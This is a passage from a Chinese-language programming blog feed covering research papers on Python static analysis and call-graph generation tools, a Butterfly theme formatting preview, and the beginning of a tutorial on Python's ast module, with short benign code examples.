class="line">print(PERSON1.height) <span class="comment"># 引用不存在的属性</span></span><br></pre></td></tr></table></figure></li><li><p>调用嵌套函数</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outer</span>():</span></span><br><span class="line">    x=<span class="number">3</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>():</span></span><br><span class="line">        print(x)</span><br><span class="line">    inner()</span><br><span class="line">outer()</span><br><span class="line">inner() <span class="comment"># 调用 outer 内部定义的函数</span></span><br></pre></td></tr></table></figure></li><li><p>闭包错误</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 闭包</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outer</span>():</span></span><br><span class="line">    x = <span class="number">3</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>():</span></span><br><span class="line">        y = <span class="number">3</span></span><br><span class="line">        result = x + y</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line">a = outer()</span><br><span class="line">print(a()) <span class="comment"># 调用 inner()</span></span><br><span class="line">print(a.__name__) <span class="comment"># 打印 inner</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 闭包错误，非预期结果</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">greet</span>(<span class="params">greet_word, name</span>) :</span></span><br><span class="line">print(greet_word, name)</span><br><span class="line">greeters = <span class="built_in">list</span>()</span><br><span class="line">names = [<span class="string">&quot;Kiki&quot;</span>, <span class="string">&quot;Riki&quot;</span>, <span class="string">&quot;Joe&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">greeters.append(<span class="keyword">lambda</span> x : greet(x, name))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> greeter <span class="keyword">in</span> greeters:</span><br><span class="line">greeter(<span class="string">&quot;Hi&quot;</span>)</span><br><span class="line"><span class="comment"># 打印</span></span><br><span class="line"><span class="comment"># Hi Joe</span></span><br><span class="line"><span class="comment"># Hi Joe</span></span><br><span class="line"><span class="comment"># Hi Joe</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="2-Towards-More-Sophisticated-Static-Analysis-Methods-of-Python-Programs"><a href="#2-Towards-More-Sophisticated-Static-Analysis-Methods-of-Python-Programs" class="headerlink" title="2. Towards More Sophisticated Static Analysis Methods of Python Programs"></a>2. Towards More Sophisticated Static Analysis Methods of Python Programs</h3><blockquote><p>Informatics 2019 • IEEE 15th International Scientific Conference on Informatics</p></blockquote><p>和上一篇同样的作者，探讨了为 Python 开发更强大的静态分析工具的可能研究方向。</p><p>总结现有的静态分析方法：模式匹配、AST 匹配、符号执行、混合执行。对比基于 AST 的 Pylint 和实验性的符号执行工具 mini-mc（使用 Z3 约束求解器的 Python 接口）</p><ul><li>4 个代码片段测试 mini-mc 的检测能力，其中 2 个片段用于比较</li></ul><table><thead><tr><th></th><th>Pylint</th><th>mini-mc</th></tr></thead><tbody><tr><td>引用未定义变量</td><td>x</td><td>√</td></tr><tr><td>可能的除零异常（误报）</td><td>x</td><td>√</td></tr></tbody></table><ol><li><p>引用未定义变量</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">arg</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span>== arg):</span><br><span class="line">        print(<span class="string">&quot;branch11 &quot;</span>, os.getpid())</span><br><span class="line">        z = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span>!=arg):</span><br><span class="line">        print(<span class="string">&quot;branch21 &quot;</span>, os.getpid())</span><br><span class="line">        x = z</span><br><span class="line"></span><br><span class="line">arg = BitVec(arg, <span class="number">32</span>)</span><br><span class="line">func(arg)</span><br></pre></td></tr></table></figure></li><li><p>可能的除零异常</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">arg</span>):</span></span><br><span class="line">    <span class="keyword">if</span> arg == <span class="number">41</span> :</span><br><span class="line">    print(<span class="string">&quot;branch21 &quot;</span>, os.getpid())</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># 输入为 42 时确实会引起异常，但其他情况下没有问题</span></span><br><span class="line">        print(<span class="string">&quot;branch22 &quot;</span>, os.getpid())</span><br><span class="line">        z = arg - <span class="number">42</span></span><br><span class="line">        z = <span class="number">99</span> / z</span><br></pre></td></tr></table></figure></li></ol><h3 id="3-Static-Value-Analysis-of-Python-Programs-by-Abstract-Interpretation"><a href="#3-Static-Value-Analysis-of-Python-Programs-by-Abstract-Interpretation" class="headerlink" title="3. Static Value Analysis of Python Programs by Abstract Interpretation"></a>3. Static Value Analysis of Python Programs by Abstract Interpretation</h3><blockquote><p>NASA Formal Methods Symposium</p></blockquote><p>通过 <strong>抽象解释</strong> 推断变量类型、运行时错误和未捕获异常，只支持一小部分内置对象和标准库的分析。</p><h2 id="调用图工具"><a href="#调用图工具" class="headerlink" title="调用图工具"></a>调用图工具</h2><h3 id="1-Empirical-Study-of-Python-Call-Graph"><a href="#1-Empirical-Study-of-Python-Call-Graph" class="headerlink" title="1. Empirical Study of Python Call Graph"></a>1. Empirical Study of Python Call Graph</h3><blockquote><p>2019 34th IEEE/ACM International Conference on Automated Software Engineering (ASE)</p></blockquote><p>对现有的 Python 程序调用图生成工具进行比对（<a href="https://github.com/davidfraser/pyan">Pyan</a>、<a href="https://github.com/scottrogowski/code2flow">Code2flow</a>、<a href="https://github.com/gak/pycallgraph">Pycallgraph</a>、Understand），以 Pycallgraph 作为基准，用常见的模块源代码进行测试（scikit-learn、theano、networkx、numba、joblib、pandas）</p><ul><li>Pyan、Code2flow、Pycallgraph（6 年前停更）：Github 开源工具</li><li>Understand：商业软件</li></ul><p>针对 pandas 模块，各个工具生成的隐式节点数目有所不同，这造成了结果的巨大差异。</p><img src="https://i.loli.net/2021/07/29/nzaZEiHlMJWAuwc.jpg" style="zoom:70%;" /><p>结论：现有的 Python 静态调用图工具在构建效果上存在较大差异，仍有改进的空间。</p><h3 id="2-PyCG-Practical-Call-Graph-Generation-in-Python"><a href="#2-PyCG-Practical-Call-Graph-Generation-in-Python" class="headerlink" title="2. PyCG: Practical Call Graph Generation in Python"></a>2. PyCG: Practical Call Graph Generation in Python</h3><blockquote><p>2021 IEEE/ACM 43rd International Conference on Software Engineering (ICSE)</p></blockquote><p>提出了一种实用的、静态的 Python 调用图生成方法。涉及上下文敏感的过程间分析，不动点迭代算法等。没有分析循环和条件语句，也不使用变量类型信息，只能分析有源码的模块。</p><p>编写如下 crypto 模块进行测试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cryptops</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, key</span>):</span></span><br><span class="line">        self.key = key</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">apply</span>(<span class="params">self, msg, func</span>):</span></span><br><span class="line"><span class="keyword">return</span> func(self.key, msg)</span><br><span class="line"></span><br><span class="line">crp = Crypto(<span class="string">&quot;secretkey&quot;</span>)</span><br><span class="line">encrypted = crp.apply(<span class="string">&quot;hello world&quot;</span>, cryptops.encrypt)</span><br><span class="line">decrypted = crp.apply(encrypted, cryptops.decrypt)</span><br></pre></td></tr></table></figure><p>(a) 是实际的调用图（人工绘制），(b) Pyan 没有进行过程间分析，(c) Depends 的策略非常保守，只有预期信息足够才生成调用边</p><img src="https://i.loli.net/2021/07/29/eoSfyqKCXFDuZwh.jpg" style="zoom:70%;" /><p>使用 PyCG 分析 crypto 模块，可以看到完整且正确的名称解析和调用</p><ul><li>橙色：模块</li><li>红色：类</li><li>黑色：函数</li><li>蓝色：变量</li></ul><img src="https://i.loli.net/2021/07/29/O7IoGZtEjwXup3A.jpg" style="zoom:70%;" /><p>微观基准测试套件（Micro-benchmark Suite）包含 112 个独特的小型代码，涵盖 Python 语言的各种特性，分为 16 个类别。</p><img src="https://i.loli.net/2021/07/29/pnfacBJVRN3TISA.jpg" style="zoom:70%;" /><p>宏观基准测试（Macro-benchmarks）使用 5 个流行的开源 Python 软件，平均用了 10h 为每个项目生成调用图</p><img src="https://i.loli.net/2021/07/29/Sqnl6K27FUxhcPk.jpg" style="zoom:70%;" /><p>PyCG 和 Pyan 对比，PyCG 基本为所有代码生成了完整的调用图（111/112），Sound 只覆盖了 103 是因为没有覆盖 Python 的星号赋值；Pyan 整体比较残念，在赋值相关的测试中表现良好。</p><img src="https://i.loli.net/2021/07/29/tq5ijGV2YyULTNP.jpg" style="zoom:70%;" /><p>这里的 complete 和 sound 是静态分析中的概念：</p><img src="https://i.loli.net/2021/07/29/MbHyi6CXpPJ4aTq.jpg" style="zoom:50%;" /><p>PyCG 和 Pyan、Depends 对比，在真实的 Python 项目上，PyCG 能够生成高精度的调用图，Recall 值较低是因为方法的局限和缺乏对 Python 某些功能特性的支持。</p><p>另外还比较了一下时间和内存的消耗（取 20 次的平均值）</p><img src="https://i.loli.net/2021/07/29/4jBnk5lyiJxMouS.jpg" style="zoom:70%;" /><h3 id="3-Qualitative-and-Quantitative-Analysis-of-Callgraph-Algorithms-for-Python"><a href="#3-Qualitative-and-Quantitative-Analysis-of-Callgraph-Algorithms-for-Python" class="headerlink" title="3. Qualitative and Quantitative Analysis of Callgraph Algorithms for Python"></a>3. Qualitative and Quantitative Analysis of Callgraph Algorithms for Python</h3><blockquote><p>2021 International Conference on Code Quality (ICCQ)</p></blockquote><p>提出了一个可扩展的 Python 调用图比较分析框架 eval_CG，包含微观测试和宏观测试</p><ul><li>微观测试：49 个小型代码，分为 13类</li><li>宏观测试：5 个开源 Python 项目，Python robotics、mitmproxy、cookiecutter、YouCompleteMe、The Fuck</li></ul><p>对不同的调用图构造工具进行系统的比较</p><ul><li>静态调用图（Code2flow、Pyan、WALA）</li><li>动态调用图（PyCallGraph）通过动态分析执行路径生成 Python 调用图，这种分析应该用另一种方法（例如模糊测试）来获得有意义的结果，否则会产生许多误报</li></ul><p>结论：这些工具生成的静态调用图都包含虚假边，而且都没有生成 sound 的调用图（没有漏报）</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>整理了几个可以用于生成调用图的工具，之后试试看：</p><ul><li><a href="https://github.com/davidfraser/pyan">Pyan3</a></li><li><a href="https://github.com/vitsalis/pycg">PyCG</a></li><li><a href="https://github.com/scottrogowski/code2flow">Code2flow</a></li><li><a href="https://pyre-check.org/docs/querying-pyre/#dump-call-graph">Pyre - Dump call graph</a></li></ul>]]></content>
    
    
    <summary type="html">概览</summary>
    
    
    
    <category term="Notes" scheme="https://jckling.github.io/categories/Notes/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Butterfly 主题预览</title>
    <link href="https://jckling.github.io/2021/07/22/Other/Butterfly%20%E4%B8%BB%E9%A2%98%E9%A2%84%E8%A7%88/"/>
    <id>https://jckling.github.io/2021/07/22/Other/Butterfly%20%E4%B8%BB%E9%A2%98%E9%A2%84%E8%A7%88/</id>
    <published>2021-07-22T09:02:46.000Z</published>
    <updated>2021-11-12T02:32:41.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="高亮文字（label）"><a href="#高亮文字（label）" class="headerlink" title="高亮文字（label）"></a>高亮文字（label）</h1><p>分行间距会很</p><mark class="hl-label default">灰色</mark> <p>大</p><mark class="hl-label blue">蓝色</mark> <mark class="hl-label pink">粉色</mark> <mark class="hl-label red">红色</mark> <mark class="hl-label purple">紫色</mark> <mark class="hl-label orange">橙色</mark> <mark class="hl-label green">绿色</mark> <h1 id="内联图片"><a href="#内联图片" class="headerlink" title="内联图片"></a>内联图片</h1><p>高度 150px 可选 <img class="inline-img" src="https://i.loli.net/2021/06/14/oSn9dxfYhEHClIe.jpg" style="height:150px"/> 后面继续接文字。</p><h1 id="相册（gallery）"><a href="#相册（gallery）" class="headerlink" title="相册（gallery）"></a>相册（gallery）</h1><div class="justified-gallery"><p><img src="https://i.loli.net/2021/06/14/2NXqsznriG8blc7.jpg"><br><img src="https://i.loli.net/2021/06/14/jcdZBHXx9TskmrM.jpg"></p>          </div><h1 id="选项卡（Tab）"><a href="#选项卡（Tab）" class="headerlink" title="选项卡（Tab）"></a>选项卡（Tab）</h1><div class="tabs" id="test"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test-1">test 1</button></li><li class="tab"><button type="button" data-href="#test-2">test 2</button></li><li class="tab"><button type="button" data-href="#test-3">test 3</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>预设选择：</p><ul><li>默认显示第 3 个：<code>&#123;% tabs test, 3 %&#125;</code></li></ul><p>自定义名称：</p><ul><li>名称：<code>&lt;!-- tab 测试 --&gt;</code></li><li>图标：<code>&lt;!-- tab @fas fa-bomb --&gt;</code></li><li>图标+名称：<code>&lt;!-- tab 炸弹@fas fa-bomb --&gt;</code>（必须反过来写）</li></ul><h1 id="按钮（Button）"><a href="#按钮（Button）" class="headerlink" title="按钮（Button）"></a>按钮（Button）</h1><a class="btn-beautify button--animated " href="https://jckling.github.io/"   title="Jckling"><span>Jckling</span></a><a class="btn-beautify button--animated " href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated outline" href="https://jckling.github.io/"   title="Jckling"><span>Jckling</span></a><a class="btn-beautify button--animated outline" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><hr><a class="btn-beautify button--animated block" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated block center larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated block right outline larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><hr><a class="btn-beautify button--animated larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated blue larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated pink larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated red larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated purple larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated orange larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated green larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><hr><div class="btn-center"><a class="btn-beautify button--animated outline larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated outline blue larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated outline pink larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated outline red larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated outline purple larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated outline orange larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a><a class="btn-beautify button--animated outline green larger" href="https://jckling.github.io/"   title="Jckling"><i class="far fa-hand-point-right"></i><span>Jckling</span></a></div><h1 id="标签（Tag）"><a href="#标签（Tag）" class="headerlink" title="标签（Tag）"></a>标签（Tag）</h1><h2 id="simple"><a href="#simple" class="headerlink" title="simple"></a>simple</h2><div class="note simple"><p>默认</p></div><div class="note default simple"><p>default</p></div><div class="note primary simple"><p>primary</p></div><div class="note success simple"><p>success</p></div><div class="note info simple"><p>info</p></div><div class="note warning simple"><p>warning</p></div><div class="note danger simple"><p>danger</p></div><h2 id="morden"><a href="#morden" class="headerlink" title="morden"></a>morden</h2><div class="note modern"><p>默认</p></div><div class="note default modern"><p>default</p></div><div class="note primary modern"><p>primary</p></div><div class="note success modern"><p>success</p></div><div class="note info modern"><p>info</p></div><div class="note warning modern"><p>warning</p></div><div class="note danger modern"><p>danger</p></div><h2 id="flat"><a href="#flat" class="headerlink" title="flat"></a>flat</h2><div class="note flat"><p>默认</p></div><div class="note default flat"><p>default</p></div><div class="note primary flat"><p>primary</p></div><div class="note success flat"><p>success</p></div><div class="note info flat"><p>info</p></div><div class="note warning flat"><p>warning</p></div><div class="note danger flat"><p>danger</p></div><h2 id="disabled"><a href="#disabled" class="headerlink" title="disabled"></a>disabled</h2><div class="note disabled"><p>默认</p></div><div class="note default disabled"><p>default</p></div><div class="note primary disabled"><p>primary</p></div><div class="note success disabled"><p>success</p></div><div class="note info disabled"><p>info</p></div><div class="note warning disabled"><p>warning</p></div><div class="note danger disabled"><p>danger</p></div><h2 id="颜色和图标"><a href="#颜色和图标" class="headerlink" title="颜色和图标"></a>颜色和图标</h2><div class="note blue flat"><p>fas fa-bullhorn</p></div><div class="note icon flat"><i class="note-icon fas fa-bullhorn"></i><p>fas fa-bullhorn</p></div><div class="note blue icon flat"><i class="note-icon fas fa-bullhorn"></i><p>fas fa-bullhorn</p></div><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>翻文档：</p><ul><li><a href="https://butterfly.js.org/posts/ceeb73f/">Butterfly 安裝文檔(四) 主題配置-2</a></li><li><a href="https://butterfly.js.org/posts/507c070f/">Butterfly添加全局吸底Aplayer教程</a></li></ul>]]></content>
    
    
    <summary type="html">渲染一些会用到，但每次都得翻文档找的东西😅</summary>
    
    
    
    <category term="Other" scheme="https://jckling.github.io/categories/Other/"/>
    
    
  </entry>
  
  <entry>
    <title>Python ast 模块使用</title>
    <link href="https://jckling.github.io/2021/07/14/Other/Python%20ast%20%E6%A8%A1%E5%9D%97%E4%BD%BF%E7%94%A8/"/>
    <id>https://jckling.github.io/2021/07/14/Other/Python%20ast%20%E6%A8%A1%E5%9D%97%E4%BD%BF%E7%94%A8/</id>
    <published>2021-07-14T06:30:05.000Z</published>
    <updated>2021-11-23T14:04:58.781Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Python-源码编译过程"><a href="#Python-源码编译过程" class="headerlink" title="Python 源码编译过程"></a>Python 源码编译过程</h1><p>Python 源码到机器码的过程，以 CPython 为例，编译过程如下：</p><ul><li>将源代码解析为解析树（Parser Tree）</li><li>将解析树转换为抽象语法树（Abstract Syntax Tree）</li><li>将抽象语法树转换到控制流图（Control Flow Graph）</li><li>根据流图将字节码（bytecode）发送给虚拟机（ceval）</li></ul><p>可以使用以下模块进行操作：</p><ul><li>ast 模块可以控制抽象语法树的生成和编译</li><li>py-compile 模块能够将源码换成字节码（编译），保存在 __pycache__ 文件夹，以 <code>.pyc</code> 结尾（不可读）</li><li>dis 模块通过反汇编支持对字节码的分析（可读）</li></ul><h1 id="ast-模块使用"><a href="#ast-模块使用" class="headerlink" title="ast 模块使用"></a>ast 模块使用</h1><p>ast 模块可以用于生成和编译 Python 代码的抽象语法树，许多静态分析工具都使用该模块生成抽象语法树。</p><p><code>ast.parse()</code> 函数可以用来生成抽象语法树，<code>ast.compile()</code> 可以将抽象语法树编译为代码。</p><p>用下列代码作为测试样例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nums</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">&quot;even: &quot;</span>, i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot; odd: &quot;</span>, i)</span><br><span class="line"></span><br><span class="line">nums()</span><br></pre></td></tr></table></figure><h2 id="编译执行"><a href="#编译执行" class="headerlink" title="编译执行"></a>编译执行</h2><p>代码对象是 CPython 实现的低级细节，涉及 code 模块，该模块是解释器基类，可用于自定义 Python 解释器。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取源文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;demo.py&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成可以被 exec() 或 eval() 执行的代码对象</span></span><br><span class="line">cm = <span class="built_in">compile</span>(data, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">exec(cm)</span><br></pre></td></tr></table></figure><h2 id="生成-AST"><a href="#生成-AST" class="headerlink" title="生成 AST"></a>生成 AST</h2><p>直接从源码生成，Python 3.9 支持 <code>indent</code> 参数，打印输出更为友好。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f_ast = ast.parse(data)</span><br><span class="line">print(ast.dump(f_ast, indent=<span class="number">4</span>))</span><br></pre></td></tr></table></figure><p>得到如下结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">Module( <span class="comment"># 第一级，模块</span></span><br><span class="line">    body=[</span><br><span class="line">        FunctionDef( <span class="comment"># 第二级，函数定义</span></span><br><span class="line">            name=<span class="string">&#x27;nums&#x27;</span>, <span class="comment"># 函数名称</span></span><br><span class="line">            args=arguments( <span class="comment"># 参数</span></span><br><span class="line">                posonlyargs=[],</span><br><span class="line">                args=[],</span><br><span class="line">                kwonlyargs=[],</span><br><span class="line">                kw_defaults=[],</span><br><span class="line">                defaults=[]),</span><br><span class="line">            body=[ <span class="comment"># 函数体</span></span><br><span class="line">                For( <span class="comment"># 循环</span></span><br><span class="line">                    target=Name(id=<span class="string">&#x27;i&#x27;</span>, ctx=Store()),</span><br><span class="line">                    iter=Call( <span class="comment"># 递归函数调用</span></span><br><span class="line">                        func=Name(id=<span class="string">&#x27;range&#x27;</span>, ctx=Load()),</span><br><span class="line">                        args=[</span><br><span class="line">                            Constant(value=2)], <span class="comment"># 参数</span></span><br><span class="line">                        keywords=[]),</span><br><span class="line">                    body=[ <span class="comment"># 循环体</span></span><br><span class="line">                        If( <span class="comment"># 条件判断</span></span><br><span class="line">                            <span class="built_in">test</span>=Compare(<span class="comment"># 比较</span></span><br><span class="line">                                left=BinOp( <span class="comment"># 左操作数</span></span><br><span class="line">                                    left=Name(id=<span class="string">&#x27;i&#x27;</span>, ctx=Load()), <span class="comment"># 左操作数</span></span><br><span class="line">                                    op=Mod(), <span class="comment"># 操作符</span></span><br><span class="line">                                    right=Constant(value=2)), <span class="comment"># 右操作数</span></span><br><span class="line">                                ops=[</span><br><span class="line">                                    Eq()],</span><br><span class="line">                                comparators=[ <span class="comment"># 右操作数</span></span><br><span class="line">                                    Constant(value=0)]),</span><br><span class="line">                            body=[ <span class="comment"># 为真</span></span><br><span class="line">                                Expr(</span><br><span class="line">                                    value=Call( <span class="comment"># 调用函数</span></span><br><span class="line">                                        func=Name(id=<span class="string">&#x27;print&#x27;</span>, ctx=Load()),</span><br><span class="line">                                        args=[</span><br><span class="line">                                            Constant(value=<span class="string">&#x27;even: &#x27;</span>),</span><br><span class="line">                                            Name(id=<span class="string">&#x27;i&#x27;</span>, ctx=Load())],</span><br><span class="line">                                        keywords=[]))],</span><br><span class="line">                            orelse=[ <span class="comment"># 为假</span></span><br><span class="line">                                Expr(</span><br><span class="line">                                    value=Call( <span class="comment"># 调用函数</span></span><br><span class="line">                                        func=Name(id=<span class="string">&#x27;print&#x27;</span>, ctx=Load()),</span><br><span class="line">                                        args=[</span><br><span class="line">                                            Constant(value=<span class="string">&#x27; odd: &#x27;</span>),</span><br><span class="line">                                            Name(id=<span class="string">&#x27;i&#x27;</span>, ctx=Load())],</span><br><span class="line">                                        keywords=[]))])],</span><br><span class="line">                    orelse=[])],</span><br><span class="line">            decorator_list=[]),</span><br><span class="line">        Expr( <span class="comment"># 第二级，表达式语句</span></span><br><span class="line">            value=Call( <span class="comment"># 调用函数</span></span><br><span class="line">                func=Name(id=<span class="string">&#x27;nums&#x27;</span>, ctx=Load()),</span><br><span class="line">                args=[],</span><br><span class="line">                keywords=[]))],</span><br><span class="line">    type_ignores=[])</span><br></pre></td></tr></table></figure><h2 id="遍历-AST"><a href="#遍历-AST" class="headerlink" title="遍历 AST"></a>遍历 AST</h2><h2 id="修改-AST"><a href="#修改-AST" class="headerlink" title="修改 AST"></a>修改 AST</h2><p>有两种方式：①修改 AST 节点；②替换 AST 节点。ast 模块提供了 <code>NodeVisitor</code> 和 <code>NodeTransformer</code> 实现这两种功能。</p><ol><li><p>将 <code>i%2 == 0</code>修改为 <code>i+2==0</code></p><ul><li><code>ast.NodeVisitor.visit</code> 如果没有实现对象的 <code>visit_classname</code> 方法，则调用 <code>generic_visit</code> 方法</li><li><code>ast.NodeVisitor.generic_visit</code> 在子节点上调用 <code>visit</code> 方法</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 